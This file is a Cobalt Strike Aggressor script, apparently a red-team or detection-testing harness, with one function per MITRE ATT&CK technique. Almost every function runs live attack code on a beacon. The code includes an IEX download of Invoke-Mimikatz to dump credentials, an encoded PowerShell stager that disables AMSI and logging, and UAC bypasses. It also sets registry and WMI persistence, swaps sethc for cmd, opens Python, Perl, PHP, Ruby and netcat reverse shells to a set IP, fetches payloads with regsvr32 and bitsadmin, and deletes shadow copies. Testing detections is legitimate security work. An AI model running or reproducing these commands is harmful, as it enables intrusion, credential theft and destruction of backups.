
sub uncomplete_command{
	show_message("uncomplete_command");
}


sub UploadFile{
	$dir = "c:\\RedTeam\\";
	bmkdir($1, $dir);
	bcd($1, $dir);
	bupload($1, script_resource("resource\\".$2));
}

sub T1086_002{
	btask($1, "通过Powershell下载执行ps脚本，触发 1086_002", "T1086");
	$shell = "Set-ExecutionPolicy Unrestricted ";
	bpowershell($1,$shell);
	$shell = "powershell.exe \"IEX(New-Object Net.WebClient).DownloadString('http://172.17.2.57:8080/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"";
	beacon_execute_job($1, $shell);
}

sub T1086_003 {
	btask($1, "execute bypass UAC With Powershell add -Enc Command", "T1086");
	$shell = "powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBFAFIAUwBJAE8AbgBUAGEAYgBsAGUALgBQAFMAVgBlAHIAcwBJAG8AbgAuAE0AQQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJABHAFAAUwA9AFsAcgBlAGYAXQAuAEEAcwBzAEUAbQBCAGwAWQAuAEcARQB0AFQAWQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBFAHQAVgBhAEwAVQBFACgAJABuAFUAbABsACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAHMAZQB7AFsAUwBjAHIASQBQAFQAQgBMAG8AQwBrAF0ALgAiAEcAZQB0AEYASQBlAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAdABWAEEATAB1AGUAKAAkAG4AVQBsAEwALAAoAE4AZQB3AC0ATwBCAEoAZQBjAHQAIABDAG8ATABsAEUAQwBUAGkATwBOAHMALgBHAEUAbgBFAHIASQBDAC4ASABBAHMASABTAGUAdABbAFMAVAByAGkAbgBnAF0AKQApAH0AWwBSAGUARgBdAC4AQQBTAHMAZQBNAGIAbAB5AC4ARwBFAFQAVABZAFAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkARQBsAEQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAQQBMAFUAZQAoACQAbgBVAEwATAAsACQAdAByAFUARQApAH0AOwB9ADsAWwBTAFkAUwB0AGUATQAuAE4AZQBUAC4AUwBFAFIAdgBJAEMARQBQAG8AaQBOAFQATQBhAG4AYQBnAEUAcgBdADoAOgBFAHgAUABFAEMAVAAxADAAMABDAG8AbgB0AEkAbgB1AGUAPQAwADsAJAB3AEMAPQBOAGUAdwAtAE8AYgBKAGUAYwBUACAAUwB5AFMAdABlAG0ALgBOAEUAdAAuAFcARQBiAEMATABJAEUATgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABHAGUAYwBrAG8AJwA7ACQAdwBjAC4ASABFAGEAZABFAHIAUwAuAEEARABkACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAVwBDAC4AUABSAE8AWAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQBUAC4AVwBFAGIAUgBFAHEAVQBFAHMAVABdADoAOgBEAEUARgBhAHUAbABUAFcARQBiAFAAcgBvAHgAWQA7ACQAVwBDAC4AUABSAE8AWAB5AC4AQwBSAEUARABlAE4AVABpAEEATABzACAAPQAgAFsAUwBZAHMAdABFAG0ALgBOAEUAdAAuAEMAcgBFAEQARQBOAHQAaQBhAEwAQwBhAGMAaABFAF0AOgA6AEQAZQBGAEEAVQBsAFQATgBFAHQAdwBvAFIAawBDAFIARQBEAEUATgBUAGkAYQBsAFMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAHkAcwB0AEUAbQAuAFQAZQBYAFQALgBFAG4AQwBPAEQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgB5AFQARQBzACgAJwBbAGUANgB6ADIAIQBwAGIAVAByADcANQBzAEUAKAAzAFAASABTAHkAWABeAGMAewBhAG4APABGAF8AaABAACsAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAHMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAG8AdQBuAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgBYAE8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMgAzADMALgAxADMAOQA6ADQANAA0ADQAJwA7ACQAdAA9ACcALwBuAGUAdwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAFIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AeABmAHcAKwBLADMAZQBDAFkAegAwAEUAZwBVAGcATgBXADEAOABCAEYAWQBQAHYAYgBMAFEAPQAiACkAOwAkAGQAYQB0AEEAPQAkAFcAQwAuAEQAbwBXAE4AbABPAEEARABEAEEAVABBACgAJABTAGUAUgArACQAVAApADsAJABpAHYAPQAkAGQAQQBUAEEAWwAwAC4ALgAzAF0AOwAkAGQAYQB0AGEAPQAkAGQAQQB0AGEAWwA0AC4ALgAkAGQAYQBUAGEALgBsAEUAbgBnAHQAaABdADsALQBqAE8ASQBuAFsAQwBoAGEAcgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AGEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==";
	beacon_execute_job($1, $shell);
}

sub T1100_001{
	
}
sub T1100_003{
	
}

sub T1004_001{
	btask($1, "设置Winlogon 加载项", "T1004");
	UploadFile($1,"hello.exe");
	$shell ='C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD "HKCU\\software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /d "c:\\RedTeam\\hello.exe" /f';
	bpowershell($1, $shell);
}

sub T1004_001_recover{

	$shell = 'C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe  delete "HKCU\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v Shell /f';
	bpowershell($1,$shell);
}

sub Win7_64BitByPass{
	UploadFile($1, "uacbypass64.exe");
	bexecute($1, "c:\\RedTeam\\uacbypass64.exe 1 calc.exe")
}

sub Win7_32BitByPass
{
	UploadFile($1, "uacbypass32.exe");
	bexecute($1, "c:\\RedTeam\\uacbypass32.exe 1 calc.exe");
}

sub Win10_64BitByPass {
	UploadFile($1, "uacbypass64.exe ");
	bexecute($1, "c:\\RedTeam\\uacbypass64.exe 34 calc.exe")
}

sub Win10_32BitByPass{
	UploadFile($1, "uacbypass32.exe");
	bexecute($1, "c:\\RedTeam\\uacbypass64.exe 34 calc.exe")
}

sub GetAdminPri {
	$bid = $1[0];
	$os = beacon_info($bid, "os");
	$ver = beacon_info($bid, "ver");
	btask($1, "获取管理员权限");
	if ($ver eq "6.1"){
		if ( -is64 $bid) {
			Win7_64BitByPass($1);
		}else {
			Win7_32BitByPass($1);
		}
	}else {
		if (-is64 $bid){
			Win10_64BitByPass($1);
		}else {
			Win10_32BitByPass($1);
		}
	}

}

sub T1088_001 {
	$bid = $1[0];
	$os = beacon_info($bid, "os");
	$ver = beacon_info($bid, "ver");
	btask($1, "根据操作系统类型，选择不同的方式绕过uac， 会弹出高权限的计算器calc.exe", "T1088");
	if ($ver eq "6.1"){
		if ( -is64 $bid) {
			Win7_64BitByPass($1);
		}else {
			Win7_32BitByPass($1);
		}
	}else {
		if (-is64 $bid){
			Win10_64BitByPass($1);
		}else {
			Win10_32BitByPass($1);
		}
	}

}

sub T1068_001 {
	
}

sub T1183_001 {
	UploadFile($1,"hello.exe");
	$shell = 'C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /d "c:\RedTeam\hello.exe" /f';
	btask($1, "镜像劫持", "T1183");
	beacon_execute_job($1, $shell);
	$shell = 'calc';
	bshell($1,$shell);
}

sub T1183_001_recover {
	btask($1, "恢复", "T1183");
	$shell = 'C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /f';
	beacon_execute_job($1, $shell);
}

sub T1085_002{
	# 此处需要先上传一个模块，然后把这个模块使用rundll32 加载起来。。。
	# 因此此处先不做这个，后面再弄
	btask($1, "rundll32加载未签名模块", "T1085");
	$dir = "c:\\RedTeam\\";
	
	bmkdir($1, $dir);
	bcd($1, $dir);
	bupload($1, script_resource("resource\\redteam.dll"));
	bexecute($1, "rundll32 redteam.dll,TestRedTeamFunc");
}

sub T1098_001_method1 {
	btask($1, "测试 IOAT1098_001 ", "T1098");
	beacon_execute_job($1,  "%COMSPEC%", " /C net user AccountCMD /add", 0);
}

sub T1098_001_method2 {
	btask($1, "测试 IOAT1098_001_Rule 方法2", "T1098");
	bexecute($1, "net user Account /add");
}


sub T1003_001 {
	btask($1, "传输dump工具到服务端并执行", "T1003");
	UploadFile($1, "pwdump.exe");

	bexecute($1, "c:\\redteam\\pwdump.exe");
}

sub T1112_001_method2{
	UploadFile($1, "hello.exe");
	UploadFile($1,"cmd.exe");
	#$shell = "cmd_back c:\\RedTeam\\T1112_002.exe";
	#bpowershell($1, $shell);
	$shell = "C:\\RedTeam\\cmd.exe /k reg.exe add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d \"c:\\RedTeam\\cmd.exe\" /f";
	beacon_execute_job($1,$shell);
}

sub T1112_001_method2_recover{
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f";
	btask($1, "恢复 ", "T1112");
	bpowershell($1, $shell);
}

sub T1085_001_method_1 {
	btask($1, "Rundll32执行js", "T1085");
	$shell = "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/src/T1085.sct\").Exec();";
	beacon_execute_job($1, $shell);

}

sub T1085_001_method2{
	btask($1, "rundll32 call vbscript with mshtml", "T1085");
	$shell = "rundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"Wscript.Shell\").Run(\"c:\\windows\\system32\\calc.exe\"),0)";
	beacon_execute_job($1, $shell);
}

sub T1103_001{
	UploadFile($1,"redteam.dll");
	$shell = 'C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_dll /d "c:\\RedTeam\\redteam.dll" /f';
	btask($1, "利用 reg命令设置app_init 项 ", "T1103");
	bpowershell($1, $shell);
}

sub T1103_001_recover{
	UploadFile($1,"T1103_recover.exe")
	$shell = 'C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe delete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_dll /f';
	btask($1, "删除app_init 项 ", "T1103");
	bpowershell($1, $shell);
}
sub T1038_001{
	
}
sub T1053_001_method1{
	btask($1, "计划任务运行rundll32", "T1053");
	$shell = 'SCHTASKS /delete /TN "spawn" /f';
	beacon_execute_job($1, $shell) ;
	$shell = 'SCHTASKS /Create /SC ONCE /TN spawn /TR "rundll32 advpack.dll, RegisterOCX c:\\RedTeam\\calc.exe"+ /st 13:20 /ru System';
	beacon_execute_job($1, $shell) ;
}

sub T1053_001_method2{
	$shell = 'schtasks /delete /tn "test" /f';
	beacon_execute_job($1, $shell);
	$shell = 'schtasks /create /tn "test" /tr c:\\RedTeam\\calc.exe /st 14:20 /sc once /ru System /f';
	btask ($1, "新增计划任务", "T1053");
	beacon_execute_job($1, $shell);
}


sub T1060_001{
	btask($1, "通过reg命令设置注册表项", "T1060");
	UploadFile($1,"hello.exe");
	#UploadFile($1,"t1060_001.exe");
	#$shell = "C:\\RedTeam\\t1060_001.exe";
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  /v T1060 /d \"C:\\RedTeam\\hello.exe\" /f";
	bpowershell($1,$shell);
}

sub T1060_001_recover{
	#UploadFile($1,"t1060_recover.exe");
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe DELETE HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run  /v T1060";
	bpowershell($1,$shell);
}

sub T1060_002{
	$user = beacon_info($1[0], "user");
	# 这里直接放一个文件进去，可能效果更好，所以此条测试不加入自动测试了，
	$path = "c:\\Users\\" . $user. "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\startup";
	btask($1, "这里请放任意一个不带签名的文件到 " . $path);
	bcd($1, $path);
	bupload($1, script_resource("resource\\T1060.exe"));
}

sub T1050_002 {
	btask($1, "测试T1050_001 时 也会触发当前规则");
}

sub T1050_001 {
	btask($1, "通过sc命令创建服务，此规则会同时触发T1050_002", "T1050");
	bcd($1, 'c:\windows\system32');
	# create a netsrv.exe file and co-locate it with this script.
	# remember netsrv.exe MUST be a service EXE.
	UploadFile($1,"netsrv.txt");
	bcd($1, 'c:\RedTeam');
	bshell($1,'rename netsrv.txt netsrv.exe')
	btimestomp($1, "C:\\RedTeam\\netsrv.exe", "C:\\Windows\\System32\\cmd.exe");
	brunasadmin($1, 'sc delete netsrv');
	brunasadmin($1, 'sc create netsrv binPath= "C:\\RedTeam\\netsrv.exe" start= auto DisplayName= "System Network Service"');
	brunasadmin($1, 'sc start netsrv');
}

sub T1050_001_recover{
	brunasadmin($1, 'sc delete netsrv');
}
sub T1068_002 {
	show_message("该规则针对Linux平台");
}


sub T1036_001{
	btask($1, "非系统目录运行svchost", "T1036");
	UploadFile($1, "svchost.exe");
	bexecute($1, "c:\\RedTeam\\svchost.exe");
}

sub T1090_002{
	btask($1, "适用工具连接127.0.0.1:3389");
	UploadFile($1, "127PortExchange.exe");
	bexecute($1, "C:\\RedTeam\\127PortExchange.exe");
}

sub T1107_001{
	btask($1,"自删除");
	UploadFile($1, "SelfDelete.exe");
	bexecute($1, "C:\\redteam\\SelfDelete.exe");
}

sub T1047_001{
	$bid = $1[0];
	if (-isadmin $bid){
		btask($1,"启动WMI ","T1047");
		$shell = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __EventFilter CREATE Name=\"PentestLab\", EventNameSpace=\"root\\cimv2\",QueryLanguage=\"WQL\", Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA\'Win32_PerfFormattedData_PerfOS_System\'\"";
		bshell($1, $shell);
		$shell = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH CommandLineEventConsumer CREATE Name=\"PentestLab\",ExecutablePath=\"C:\\Windows\\System32\\calc.exe\",CommandLineTemplate=\"C:\\Windows\\System32\\calc.exe\"";
		bshell($1, $shell);
		$shell = "wmic /NAMESPACE:\"\\\\root\\subscription\" PATH __FilterToConsumerBinding CREATE Filter=\"__EventFilter.Name=\\\"PentestLab\\\"\", Consumer=\"CommandLineEventConsumer.Name=\\\"PentestLab\\\"\"";
		bshell($1, $shell);
		$shell = "wmic process call create calc.exe";
		bshell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}

}

sub T1047_002{
	$bid = $1[0];
	if (-isadmin $bid){
		btask($1,"删除WMI","T1047");
		$shell = "Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \"Name='PentestLab'\" | Remove-WmiObject -Verbose";
		btask($1,$shell);
		bpowershell($1, $shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}
	
}

sub T1177_001{
	$bid = $1[0];
	if (-isadmin $bid){
		btask($1,"添加键值","T1177");
		$shell = "Remove-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt";
		bpowershell($1,$shell);
		# 由于无法保证之前是否有人新建过键值，所以先删除键值.
		$shell2 = "new-ItemProperty  -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NTDS -Name LsaDbExtPt -Value '\"c:\\temp\\lsass_lib.dll\",\"\\\\share\\lulz\\lsass_lib.dll\"'";
		bpowershell($1,$shell2);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}
	
}

sub T1059_callback{
	$ip = $3['ip'];
	$port = $3['port'];
	$1 = $3['bid'];
	bssh($1, $ip, $port, 123, 123);
}

sub T1059_dialog{
	$dialog = dialog('请输入目标ip和端口',%(ip=> "172.17.2.58"，port =>"80",bid =>"$1"),&T1059_callback);
	drow_text($dialog,"ip", "ip: ", 20);
	drow_text($dialog,"port", "Port: ", 20);
	drow_beacon($dialog,"bid","Session:");
	dbutton_action($dialog, "Build");
    dialog_show($dialog);	
}

sub T1059_001{
	bsudo($1, '123', "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"172.17.2.56\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'");
	bsudo($1,'123',"export RHOST=\"10.10.10.10\";export RPORT=805;python -c \'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")\'");
}

sub T1059_002{
	bsudo($1, '123',"perl -e \'use Socket;\$i=\"172.17.2.56\";\$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))\{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");\};\'");
}

sub T1059_003{
	bsudo($1, '123',"php -r \'\$sock=fsockopen(\"172.17.2.56\",80);exec(\"/bin/sh -i <&3 >&3 2>&3\");\'");
}

sub T1059_004{
	bsudo($1, '123',"ruby -rsocket -e\'f=TCPSocket.open(\"172.17.2.56\",80).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)\'");
	bsudo($1, '123',"ruby -rsocket -e \'exit if fork;c=TCPSocket.new(\"[IPADDR]\",\"[PORT]\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end\'");
}

sub T1059_005{
	bsudo($1,'123',"nc -e /bin/bash 172.17.2.56 80");
}

sub T1117_001{	
	$shell = "regsvr32.exe /s /i:http://172.17.2.57:8080/back.sct scrobj.dll";
	beacon_execute_job($1, $shell);
}

sub T1203_001{
	
	UploadFile($1, "test.doc");
	$2 = 2;
	sleep($1,int($2));
	$dir = "c:\\RedTeam\\";
	bcd($1, $dir);

	$shell = "test.doc";
	bshell($1,$shell);
}

sub T1490_001{

	$bid = $1[0];
	if (-isadmin $bid){
		btask($1)
		$shell = "wmic shadowcopy delete &&wbadmin delete catalog && vssadmin delete shadows /all";
		bshell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}	
}

sub T1002_001{
	UploadFile($1,"rar.exe");
	$shell = "c:\\RedTeam\\rar.exe a test1.rar C:/ReadTeam/ ";
	bshell($1,$shell);
}

sub T1556_001{
	bcd($1,"c:\\Windows\\System32");
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe QUERY HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Notification Packages\"";
	bshell($1,$shell);
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v \"Notification Packages\" /t REG_MULTI_SZ /d \"scecli\\0aisakeng\" /f";
	bshell($1,$shell);
}

sub T1015_001{
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f";
	bshell($1,$shell);
	$shell = "shutdown /r /f";
	bshell($1,$shell);

}

sub T1015_002{
	$bid = $1[0];
	
	$shell = "takeown /F \"C:\\Windows\\System32\\sethc.exe\"";
	bshell($1,$shell);
	$shell = "icacls \"C:\\Windows\\System32\\sethc.exe\" /grant Users:F";
	bshell($1,$shell);
	$shell = "copy cmd.exe sethc.exe";
	bshell($1,$shell);
	#UploadFile($1,"T1015.exe");
	$shell = "C:\\Windows\\System32\\sethc.exe /k ipconfig";
	bpowershell($1,$shell);	
}

sub T1015_003{
	$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1 /f";
	bshell($1,$shell);
	$shell = "shutdown /r /f";
	bshell($1,$shell);
}

sub T1175_001{
	$bid = $1[0];
	if (-isadmin $bid){
		$shell = "sc start DcomLaunch";
		bshell($1,$shell);
		$shell = "\$Com=[Activator]::CreateInstance([Type]::GetTypeFromProgID(\"MMC20.Application\",\"localhost\"))\;\$Com.Document.ActiveView.ExecuteShellCommand(\"c:\\windows\\system32\\calc.exe\", \$null, \$null, \"7\")";
		bpowershell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}	
}

sub T1036_001_002{
	UploadFile($1,"win32UIDEMO.JPG");
	$shell = "C:\\RedTeam\\win32UIDEMO.JPG";
	bshell($1,$shell);
}

sub T1036_003{
	UploadFile($1,"lsass.exe");
	$shell = "c:\\RedTeam\\lsass.exe";
	bshell($1,$shell);
}

sub T1036_005_001{
	$shell = "powershell calc";
	bshell($1,$shell);
}

sub T1036_005_002{
	UploadFile($1,"powershell.exe");
	$shell = "C:\\RedTeam\\powershell.exe calc";
	bshell($1,$shell);
}

sub T1036_005_003{
	$dir = "C:\\Windows\\System32\\";
	bmkdir($1, $dir);
	bcd($1, $dir);
	bupload($1, script_resource("resource\\powershell2.exe"));
	$shell = "C:\\Windows\\System32\\powershell2.exe calc";
	bshell($1,$shell);
}

sub T1562_001{
	$bid = $1[0];
	if (-isadmin $bid){
		$shell = "remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
		bpowershell($1,$shell);
		$shell = "new-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001";
		bpowershell($1,$shell);
		$shell = "remove-ItemProperty -Path HKCU:\\Software\\Microsoft\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
		bpowershell($1,$shell);
		$shell = "new-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001";
		bpowershell($1,$shell);
		$shell = "remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\GroupPolicyObjects\\LocalUser\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
		bpowershell($1,$shell);
		$shell = "new-ItemProperty -Path HKCU:\\Software\Microsoft\\Windows\\CurrentVersion\\GroupPolicyObjects\\LocalUser\\Software\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr -propertyType Dword -Value 0x00000001";
		bpowershell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}	
}

sub T1562_001_recover{
	$bid = $1[0];
	if (-isadmin $bid){
		$shell = "remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
		bpowershell($1,$shell);
		$shell = "remove-ItemProperty -Path HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
		bpowershell($1,$shell);
		$shell = "remove-ItemProperty -Path HKCU:\\Software\\Microsoft\Windows\\CurrentVersion\\GroupPolicyObjects\\LocalUser\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name DisableTaskMgr";
		bpowershell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}	
}

sub T1078_001{	
	$bid = $1[0];
	btask($1,"/c4***进行用户组提升操作****");
	#$shell = "takeown /F \"C:\\Windows\\System32\\cmd.exe\" /A";
	#bshell($1,$shell);
	#$shell = "icacls \"C:\\Windows\\System32\\cmd.exe\" /grant Administrators:F";
	#bshell($1,$shell);
	#$shell = "ren C:\\Windows\\System32\\cmd.exe cmd_back.exe";
	#bpowershell($1,$shell);
	#$shell = "setx -m comspec \"%SystemRoot%\\System32\\cmd_back.exe\"";
	#bpowershell($1,$shell);
	$shell = "Net Localgroup administrators Tests /del";
	bshell($1,$shell);
	$shell = "Net Localgroup administrators Tests /add";
	bshell($1,$shell);
}

sub T1078_001_recover{
	$bid = $1[0];
	btask($1,"\c4*******降低权限*******");
	$shell = "Net Localgroup administrators Tests /del";
	bpowershell($1,$shell);
}

sub T1209_001{
	$bid = $1[0];
	if (-isadmin $bid){
		bcd($1,"C:\\Windows\\System32\\");
		$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe Add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpClient /v dllname /t REG_SZ /f /D \"c:\\test.dll\"";
		bshell($1,$shell);
		$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe Add HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpServer  /v dllname /t REG_SZ /f /D \"c:\\test.dll\"";
		bshell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}
}

sub T1209_001_recover{
	$bid = $1[0];
	if (-isadmin $bid){
		$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe delete HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpClient /v dllname  /f ";
		bshell($1,$shell);
		$shell = "C:\\Windows\\System32\\cmd.exe /k %windir%\\System32\\reg.exe delete HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\TimeProviders\\NtpServer  /v dllname  /f ";
		bshell($1,$shell);
	}
	else{
		btask($1,"\c4*******请先提权*******");
	}
}



sub T1197_001_001{
	$shell = "bitsadmin /create addfile";
	bshell($1,$shell);
	$shell = "bitsadmin /addfile addfile http://172.17.2.57:8080/test.exe  c:\\RedTeam\\test.exe";
	bshell($1,$shell);
	$shell = "bitsadmin /RESUME addfile";
	bshell($1,$shell);
	$shell = "bitsadmin /complete addfile";
	bshell($1,$shell);
}

